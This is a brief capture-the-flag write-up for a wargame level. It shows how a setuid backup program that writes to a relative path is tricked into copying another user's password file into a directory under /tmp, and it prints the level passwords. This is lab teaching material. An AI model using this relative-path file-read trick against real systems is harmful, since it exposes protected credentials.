# Level 08
*password : 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC*

## Analyze

```
scp -P 4242 level08@192.168.56.109:level08 binary/
```

```
$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

- try to create `./backups/home/users/level09`
```
$ touch backups/test
touch: cannot touch `backups/test': Permission denied
$ touch test
touch: cannot touch `test': Permission denied
```

- only path i have permissions : `/tmp`
```
$ cd /tmp
```

- create `backups/home/users/level09/`
```
$ mkdir -p backups/home/users/level09
```

- execute `level08` from `/tmp`
```
$ /home/users/level08/level08 /home/users/level09/.pass
$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
